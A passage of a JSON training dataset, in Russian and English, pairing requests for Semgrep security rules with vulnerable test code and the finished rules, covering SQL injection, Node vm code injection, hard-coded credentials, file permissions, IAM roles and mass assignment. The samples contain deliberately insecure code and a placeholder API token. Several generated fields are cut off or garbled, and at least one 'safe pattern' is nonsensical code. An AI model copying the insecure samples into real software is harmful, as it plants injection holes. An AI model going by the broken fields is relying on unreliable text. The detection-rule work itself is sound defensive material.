LOW\n    impact: HIGH\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SQL-инъекции в коде Vert.x. Оно ищет вызовы методов query, preparedQuery и prepare в классах SqlClient и SqlConnection, где строка SQL формируется динамически через конкатенацию или форматирование строк. Правило исключает случаи, когда строка SQL является константой, объединенной с помощью оператора '+' и не содержит переменных. Также исключаются методы, принимающие жестко заданную строку SQL.\n\n# Ключевые элементы:\n- ID: vertx-sqli\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "vertx-sqli",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: express-vm-injection\nОписание уязвимости: Make sure that unverified user data can not reach `$VM`.\nCWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\nТип анализа: taint\nЯзык: javascript\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: javascript\n- Тип анализа: taint\n- CWE: CWE-94: Improper Control of Generation of Code ('Code Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: express-vm-injection.js\nconst vm = require('vm')\n\nlet ctrl1 = function test1(req,res) {\n    var input = req.query.something || ''\n    var sandbox = {\n        foo: input\n    }\n    vm.createContext(sandbox)\n    // ruleid:express-vm-injection\n    vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n    res.send('hello world')\n}\napp.get('/', ctrl1)\n\napp.get('/', (req,res) => {\n    var sandbox = {\n        foo: req.query.userInput\n    }\n    vm.createContext(sandbox)\n    // ruleid:express-vm-injection\n    vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n    res.send('hello world')\n})\n\n// ok:express-vm-injection\nfunction testOk1(userInput) {\n    var sandbox = {\n        foo: 1\n    }\n    vm.createContext(sandbox)\n    vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n}\n\nvar ctrl2 = null;\nctrl2 = function test2(req,res) {\n    var input = req.query.something || ''\n    var sandbox = {\n        foo: input\n    }\n    // ruleid:express-vm-injection\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n    res.send('hello world')\n}\napp.get('/', ctrl2)\n\n\napp.get('/', function (req,res) {\n    var sandbox = {\n        foo: req.query.userInput\n    }\n    // ruleid:express-vm-injection\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n    res.send('hello world')\n})\n\n// ok:express-vm-injection\napp.get('/', function testOk1(userInput) {\n    var sandbox = {\n        foo: 1\n    }\n    vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n    res.send('hello world')\n})\n\napp.get('/', function(req,res) {\n    const code = `\n        var x = ${req.query.userInput};\n    `\n    // ruleid:express-vm-injection\n    vm.runInThisContext(code)\n    res.send('hello world')\n})\n\n// ok:express-vm-injection\napp.get('/', function okTest3(req,res) {\n    const code = `\n        var x = 1;\n    `\n    vm.runInThisContext(code)\n    res.send('hello world')\n})\n\napp.get('/', function   # Ограничиваем длину\n\nОпасные паттерны:\n• vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n• vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })\n• new vm.Script(`...${req.query.userInput}...`)\n\nБезопасные паттерны:  \n• vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 }) where input is sanitized or trusted\n• vm.runInNewContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 }) where input is sanitized or trusted\n• vm.runInThisContext(code) where code is static and not derived from user input\n\nЛегенда аннотаций:\n- // ruleid:express-vm-injection: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:express-vm-injection: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: express-vm-injection\n  message: >-\n    Make sure that unverified user data can not reach `$VM`.\n  metadata:\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n    cwe:\n    - \"CWE-94: Improper Control of Generation of Code ('Code Injection')\"\n    category: security\n    technology:\n    - express\n    cwe2022-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-inside: |\n        $VM = require('vm');\n        ...\n    - pattern-either:\n      - pattern: |\n          $VM.runInContext(...)\n      - pattern: |\n          $VM.runInNewContext(...)\n      - pattern: |\n          $VM.compileFunction(...)\n      - pattern: |\n          $VM.runInThisContext(...)\n      - pattern: |-\n          new $VM.Script(...)\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска уязвимостей express-vm-injection, где пользовательский ввод не проверяется должным образом перед использованием в небезопасных операциях виртуальной машины JavaScript. Анализ выполняется методом taint, отслеживая источники (sources) потенциально небезопасного ввода и сопоставляя их с операциями (sinks), которые могут привести к выполнению вредоносного кода. Источниками являются различные свойства объекта запроса ($REQ), такие как query, body, params, cookies и headers. Опасными операциями считаются вызовы функций runInContext, runInNewContext, compileFunction и runInThisContext, а также создание экземпляров Script через новый оператор.\n\n# Ключевые элементы:\n- ID: express-vm-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "express-vm-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения confluent-secret-key\nОписание уязвимости: A gitleaks confluent-secret-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: confluent-secret-key.go\n// ruleid: confluent-secret-key\nconfluent_api_token = \"l2ug6iykc7kouc3no9x07tdufvlmj2dsxcqe00nef3ca5o9x8iv68nmsoll50uk6\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: confluent-secret-key\\nconfluent_api_key = \\\n• // ruleid: confluent-secret-key\\nvar confluentSecretKey = \\\n\nБезопасные паттерны:  \n• // safe: confluent secret key stored in environment variable\\nconfluent_api_key := os.Getenv(\\\n• )\n• // safe: confluent secret key retrieved from secure vault\\nconfluent_secret_key := vault.GetSecret(\\\n\nЛегенда аннотаций:\n- // ruleid:confluent-secret-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:confluent-secret-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: confluent-secret-key\n  message: A gitleaks confluent-secret-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:confluent)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{64})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило использует регулярное выражение для поиска жестко закодированных секретных ключей Confluent API. Оно ищет строку 'confluent' в сочетании с последовательностью из 64 символов, которые могут быть буквами нижнего регистра, цифрами или специальными символами (- _ \\t .), за которыми следуют различные символы сравнения (= > : | <= => : ?=) и конечные разделители (' \\\n\n# Ключевые элементы:\n- ID: confluent-secret-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "confluent-secret-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: overly-permissive-file-permission\nОписание уязвимости: Detected file permissions that are overly permissive (read, write, and execute). It is generally a bad practices to set overly permissive file permission such as read+write+exec for all users. If the file affected is a configuration, a binary, a script or sensitive data, it can lead to privilege escalation or information leakage. Instead, follow the principle of least privilege and give users only the  permissions they need.\nCWE: CWE-276: Incorrect Default Permissions\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-276: Incorrect Default Permissions\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: overly-permissive-file-permission.java\npackage testcode.file.permissions;\n\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.HashSet;\nimport java.util.Set;\n\npublic class FileApi {\n\n    public static void notOk() throws IOException {\n        // ruleid:overly-permissive-file-permission\n        Files.setPosixFilePermissions(Paths.get(\"/var/opt/app/init_script.sh\"), PosixFilePermissions.fromString(\"rw-rw-rw-\"));\n        // ruleid:overly-permissive-file-permission\n        Files.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rw-rw-r--\"));\n    }\n\n    public static void notOk2() throws IOException {\n        Set<PosixFilePermission> perms = new HashSet<>();\n        perms.add(PosixFilePermission.OWNER_READ);\n        perms.add(PosixFilePermission.OWNER_WRITE);\n        perms.add(PosixFilePermission.OWNER_EXECUTE);\n\n        perms.add(PosixFilePermission.GROUP_READ);\n        perms.add(PosixFilePermission.GROUP_WRITE);\n        perms.add(PosixFilePermission.GROUP_EXECUTE);\n\n        // ruleid:overly-permissive-file-permission\n        perms.add(PosixFilePermission.OTHERS_READ);\n        // ruleid:overly-permissive-file-permission\n        perms.add(PosixFilePermission.OTHERS_WRITE);\n        // ruleid:overly-permissive-file-permission\n        perms.add(PosixFilePermission.OTHERS_EXECUTE);\n\n        Files.setPosixFilePermissions(Paths.get(\"/var/opt/app/init_script.sh\"),perms);\n    }\n\n    public static void ok() throws IOException {\n        Files.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rw-rw----\"));\n        Files.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rwxrwx---\"));\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid:overly-permissive-file-permission\nFiles.setPosixFilePermissions(Paths.get(\"/var/opt/app/init_script.sh\"), PosixFilePermissions.fromString(\"rw-rw-rw-\"));\n• // ruleid:overly-permissive-file-permission\nFiles.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rw-rw-r--\"));\n• // ruleid:overly-permissive-file-permission\nSet<PosixFilePermission> perms = new HashSet<>();...perms.add(PosixFilePermission.OTHERS_READ);...Files.setPosixFilePermissions(Paths.get(\"/var/opt/app/init\n\nБезопасные паттерны:  \n• Files.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rw-rw----\"));\n• Files.setPosixFilePermissions(Paths.get(\"/var/opt/configuration.xml\"), PosixFilePermissions.fromString(\"rwxrwx---\"));\n\nЛегенда аннотаций:\n- // ruleid:overly-permissive-file-permission: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:overly-permissive-file-permission: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: overly-permissive-file-permission\n  message: >-\n    Detected file permissions that are overly permissive (read, write, and execute).\n    It is generally a bad practices to set overly permissive file permission such\n    as read+write+exec for all users.\n    If the file affected is a configuration, a binary, a script or sensitive data,\n    it can lead to privilege escalation or information leakage.\n    Instead, follow the principle of least privilege and give users only the \n    permissions they need.\n  severity: WARNING\n  languages: [java]\n  metadata:\n    cwe:\n    - 'CWE-276: Incorrect Default Permissions'\n    owasp:\n    - A01:2021 - Broken Access Control\n    source-rule-url: https://find-sec-bugs.github.io/bugs.htm#OVERLY_PERMISSIVE_FILE_PERMISSION\n    category: security\n    technology:\n    - java\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n  pattern-either:\n  - pattern: java.nio.file.Files.setPosixFilePermissions($FILE, java.nio.file.attribute.PosixFilePermissions.fromString(\"=~/(^......r..$)|(^.......w.$)|(^........x$)/\"));\n  - pattern: |\n      $TYPE $P = java.nio.file.attribute.PosixFilePermissions.fromString(\"=~/(^......r..$)|(^.......w.$)|(^........x$)/\");\n      ...\n      java.nio.file.Files.setPosixFilePermissions($FILE, $P);\n  - pattern: |\n      $P.add(java.nio.file.attribute.PosixFilePermission.OTHERS_READ);\n      ...\n      java.nio.file.Files.setPosixFilePermissions($FILE, $P);\n  - pattern: |\n      $P.add(java.nio.file.attribute.PosixFilePermission.OTHERS_WRITE);\n      ...\n      java.nio.file.Files.setPosixFilePermissions($FILE, $P);\n  - pattern: |-\n      $P.add(java.nio.file.attribute.PosixFilePermission.OTHERS_EXECUTE);\n      ...\n      java.nio.file.Files.setPosixFilePermissions($FILE, $P);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска чрезмерно разрешенных прав доступа к файлам в Java-коде. Оно использует шаблон поиска, который проверяет вызовы методов setPosixFilePermissions из пакета java.nio.file.Files с параметрами, соответствующими шаблону rw-rw-rw-, rw-rw-r-- или другим комбинациям разрешений, которые предоставляют полный доступ всем пользователям. Правило также учитывает случаи добавления разрешений OTHERS_READ, OTHERS_WRITE и OTHERS_EXECUTE через объект типа Set<PosixFilePermission>.\n\n# Ключевые элементы:\n- ID: overly-permissive-file-permission\n- Язык: java \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "overly-permissive-file-permission",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения gosql-sqli\nОписание уязвимости: Detected string concatenation with a non-literal variable in a \"database/sql\" Go SQL statement. This could lead to SQL injection if the variable is user-controlled and not properly sanitized. In order to prevent SQL injection, use parameterized queries or prepared statements instead. You can use prepared statements with the 'Prepare' and 'PrepareContext' calls.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: gosql-sqli.go\npackage main\n\nimport \"database/sql\"\nimport \"fmt\"\n\nfunc bad1() {\n    db, err := sql.Open(\"mysql\", \"theUser:thePassword@/theDbName\")\n    if err != nil {\n        panic(err)\n    }\n    query = \"SELECT name FROM users WHERE age=\" + req.FormValue(\"age\")\n    // ruleid: gosql-sqli\n    db.Query(query)\n}\n\nfunc bad2(db *sql.DB) {\n    query = \"SELECT name FROM users WHERE age=\"\n    query += req.FormValue(\"age\")\n    // ruleid: gosql-sqli\n    db.QueryRow(query)\n}\n\nfunc bad3(db *sql.DB) {\n    query = fmt.Sprintf(\"SELECT * FROM users WHERE email='%s';\", email)\n    // ruleid: gosql-sqli\n    db.Exec(query)\n}\n\nfunc bad4(db *sql.DB) {\n    // ruleid: gosql-sqli\n    db.Exec(\"SELECT name FROM users WHERE age=\" + req.FormValue(\"age\"))\n}\n\nfunc bad5(db *sql.DB) {\n    // ruleid: gosql-sqli\n    db.Exec(fmt.Sprintf(\"SELECT * FROM users WHERE email='%s';\", email))\n}\n\nfunc ok1(db *sql.DB) {\n    query = fmt.Sprintf(\"SELECT * FROM users WHERE email=hello;\")\n    // ok: gosql-sqli\n    db.Exec(query)\n}\n\nfunc ok2(db *sql.DB) {\n    query = \"SELECT name FROM users WHERE age=\" + \"3\"\n    // ok: gosql-sqli\n    db.Query(query)\n}\n\nfunc ok3(db *sql.DB) {\n    query = \"SELECT name FROM users WHERE age=\"\n    query += \"3\"\n    // ok: gosql-sqli\n    db.Query(query)\n}\n\nfunc ok4(db *sql.DB) {\n    // ok: gosql-sqli\n    db.Exec(\"INSERT INTO users(name, email) VALUES($1, $2)\",\n  \"Jon Calhoun\", \"jon@calhoun.io\")\n}\n\nfunc ok5(db *sql.DB) {\n    // ok: gosql-sqli\n    db.Exec(\"SELECT name FROM users WHERE age=\" + \"3\")\n}\n\nfunc ok6(db *sql.DB) {\n    // ok: gosql-sqli\n    db.Exec(fmt.Sprintf(\"SELECT * FROM users WHERE email=hello;\"))\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• query = \\\n•  + req.FormValue(\\\n• )\n\nБезопасные паттерны:  \n• query = fmt.Sprintf(\\\n• )\n• query = \\\n\nЛегенда аннотаций:\n- // ruleid:gosql-sqli: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gosql-sqli: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gosql-sqli\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: $DB.$METHOD(...,$QUERY,...)\n      - pattern-either:\n        - pattern-inside: |\n            $QUERY = $X + $Y\n            ...\n        - pattern-inside: |\n            $QUERY += $X\n            ...\n        - pattern-inside: |\n            $QUERY = fmt.Sprintf(\"...\", $PARAM1, ...)\n            ...\n      - pattern-not-inside: |\n          $QUERY += \"...\"\n          ...\n      - pattern-not-inside: |\n          $QUERY = \"...\" + \"...\"\n          ...\n    - pattern: $DB.$METHOD(..., $X + $Y, ...)\n    - pattern: $DB.$METHOD(..., fmt.Sprintf(\"...\", $PARAM1, ...), ...)\n  - pattern-either:\n    - pattern-inside: |\n        $DB, ... = sql.Open(...)\n        ...\n    - pattern-inside: |\n        func $FUNCNAME(..., $DB *sql.DB, ...) {\n          ...\n        }\n  - pattern-not: $DB.$METHOD(..., \"...\" + \"...\", ...)\n  - metavariable-regex:\n      metavariable: $METHOD\n      regex: ^(Exec|ExecContent|Query|QueryContext|QueryRow|QueryRowContext)$\n  languages:\n  - go\n  message: >-\n    Detected string concatenation with a non-literal variable in a \"database/sql\"\n    Go SQL statement. This could lead to SQL injection if the variable is user-controlled\n    and not properly sanitized. In order to prevent SQL injection,\n    use parameterized queries or prepared statements instead.\n    You can use prepared statements with the 'Prepare' and 'PrepareContext' calls.\n  metadata:\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    references:\n    - https://golang.org/pkg/database/sql/\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: HIGH\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска небезопасных конкатенаций строк в SQL-запросах языка Go, использующих библиотеку \\\n\n# Ключевые элементы:\n- ID: gosql-sqli\n- Язык: go \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "gosql-sqli",
      "language": "go",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: gcp-project-service-account-user-iam-member\nОписание уязвимости: Ensure that IAM users are not assigned the Service Account User or Service Account Token Creator roles at project level\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: gcp-project-service-account-user-iam-member.tf\n# fail\n# ruleid: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"fail1\" {\n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountTokenCreator\"\n    member  = \"user:jane@example.com\"\n}\n\n# fail\n# ruleid: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"fail2\" {\n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountUser\"\n    member  = \"user:jane@example.com\"\n}\n\n# ok: gcp-project-service-account-user-iam-member\nresource \"google_project_iam_member\" \"success\" {\n    project = \"your-project-id\"\n    role    = \"roles/editor\"\n    member  = \"user:jane@example.com\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"google_project_iam_member\" \"fail1\" { \n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountTokenCreator\"\n    member  = \"user:jane@example.com\"\n}\n• resource \"google_project_iam_member\" \"fail2\" { \n    project = \"your-project-id\"\n    role    = \"roles/iam.serviceAccountUser\"\n    member  = \"user:jane@example.com\"\n}\n\nБезопасные паттерны:  \n• resource \"google_project_iam_member\" \"success\" { \n    project = \"your-project-id\"\n    role    = \"roles/editor\"\n    member  = \"user:jane@example.com\"\n}\n\nЛегенда аннотаций:\n- // ruleid:gcp-project-service-account-user-iam-member: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:gcp-project-service-account-user-iam-member: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: gcp-project-service-account-user-iam-member\n  patterns:\n  - pattern: resource\n  - pattern-either:\n    - pattern-inside: |\n        resource \"google_project_iam_member\" \"...\" {\n        ...\n        role = \"roles/iam.serviceAccountTokenCreator\"\n        ...\n        }\n    - pattern-inside: |\n        resource \"google_project_iam_member\" \"...\" {\n        ...\n        role = \"roles/iam.serviceAccountUser\"\n        ...\n        }\n  message: >-\n    Ensure that IAM users are not assigned the Service Account User or Service Account Token Creator roles\n    at project level\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - gcp\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Google Cloud Platform (GCP) типа google_project_iam_member с заданными ролями serviceAccountTokenCreator или serviceAccountUser на уровне проекта. Паттерн использует pattern-inside для поиска конкретного шаблона HCL-кода, содержащего эти роли. Правило применимо только к файлам с расширением .tf, написанным на языке HCL.\n\n# Ключевые элементы:\n- ID: gcp-project-service-account-user-iam-member\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "gcp-project-service-account-user-iam-member",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения check-permit-attributes-high\nОписание уязвимости: Calling `permit` on security-critical properties like `$ATTRIBUTE` may leave your application vulnerable to mass assignment.\nCWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nТип анализа: search\nЯзык: ruby",
    "input": "Требования:\n- Язык: ruby\n- Тип анализа: search\n- CWE: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: check-permit-attributes-high.rb\n  params = ActionController::Parameters.new({\n  person: {\n    name: \"Francesco\",\n    age:  22,\n    role: \"admin\"\n  }\n})\n\n#ruleid: check-permit-attributes-high\nparams.permit(:admin)\n#ok: check-permit-attributes-high\nparams.permit(:some_safe_property)  # Ограничиваем длину\n\nОпасные паттерны:\n• params.permit(:admin)\n• params.permit(:account_id)\n\nБезопасные паттерны:  \n• params.permit(:some_safe_property)\n• params.permit(:another_safe_attribute)\n\nЛегенда аннотаций:\n- // ruleid:check-permit-attributes-high: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:check-permit-attributes-high: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: check-permit-attributes-high\n  patterns:\n  - pattern: $P.permit($ATTRIBUTE)\n  - metavariable-regex:\n      metavariable: $ATTRIBUTE\n      regex: .*(admin|account_id).*\n  message: Calling `permit` on security-critical properties like `$ATTRIBUTE` may leave your application\n    vulnerable to mass assignment.\n  languages:\n  - ruby\n  severity: ERROR\n  metadata:\n    source-rule-url: https://github.com/presidentbeef/brakeman/blob/main/lib/brakeman/checks/check_permit_attributes.rb\n    category: security\n    cwe:\n    - 'CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes'\n    owasp:\n    - A08:2021 - Software and Data Integrity Failures\n    technology:\n    - ruby\n    - rails\n    references:\n    - https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов метода permit в Ruby/Rails, где аргумент представляет критическое свойство безопасности, такое как '$ATTRIBUTE', которое может быть динамически определено. Паттерн ищет конструкцию, где метод permit вызывается с аргументом, соответствующим регулярному выражению '(admin|account_id)', указывающему на потенциально опасные атрибуты. Правило использует метавариабельную переменную для захвата имени атрибута и проверяет соответствие шаблону регулярных выражений.\n\n# Ключевые элементы:\n- ID: check-permit-attributes-high\n- Язык: ruby \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "check-permit-attributes-high",
      "language": "ruby",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: memory-marshal-create-span\nОписание уязвимости: MemoryMarshal.CreateSpan and MemoryMarshal.CreateReadOnlySpan should be used with caution, as the length argument is not checked.\nCWE: CWE-125: Out-of-bounds Read\nТип анализа: search\nЯзык: C#",
    "input": "Требования:\n- Язык: C#\n- Тип анализа: search\n- CWE: CWE-125: Out-of-bounds Read\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: memory-marshal-create-span.cs\nnamespace MemMarshalCreateSpan {\n    public class MemMarshalCreateSpan {\n        public void MarshalTest() {\n            // ruleid: memory-marshal-create-span\n            Span<T> ToSpan() => MemoryMarshal.CreateSpan(ref _e0, 1);\n\n            // ruleid: memory-marshal-create-span\n            Span<T> ToSpan() => MemoryMarshal.CreateReadOnlySpan(ref _e0, 2);\n\n            // ruleid: memory-marshal-create-span\n            Span<byte> span = MemoryMarshal.CreateSpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 4);\n\n            // ruleid: memory-marshal-create-span\n            Span<byte> span = MemoryMarshal.CreateReadOnlySpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 8);\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Span<T> ToSpan() => MemoryMarshal.CreateSpan(ref _e0, 1);\n• Span<T> ToSpan() => MemoryMarshal.CreateReadOnlySpan(ref _e0, 2);\n• Span<byte> span = MemoryMarshal.CreateSpan(ref Unsafe.AsRef(writer.Span.GetPinnableReference()), 4);\n\nБезопасные паттерны:  \n• Span<int> span = new Span<int>(array, 0, array.Length);\n• MemoryMarshal.Cast<int*, float*>(ref ptr).Length = 10;\n• int[] array = { 1, 2, 3 }; Span<int> span = new Span<int>(array);\n\nЛегенда аннотаций:\n- // ruleid:memory-marshal-create-span: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:memory-marshal-create-span: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
